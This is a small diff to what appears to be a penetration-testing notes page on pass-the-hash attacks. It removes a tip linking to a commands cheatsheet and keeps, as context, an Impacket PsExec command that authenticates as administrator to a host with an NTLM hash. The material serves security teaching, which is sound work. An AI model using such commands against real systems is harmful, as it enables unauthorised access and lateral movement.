@@ -19,12 +19,6 @@ Several tools can be used for this attack:
 
 ## Examples
 
-:::tip Pass the Hash section
-
-You can refer to the [Pass the Hash section on Commands Cheatsheet](/commands-cheatsheet/windows/pass-the-hash) for detailed usage of these tools.
-
-:::
-
 ```bash title="Impacket PsExec Example"
 impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 ```
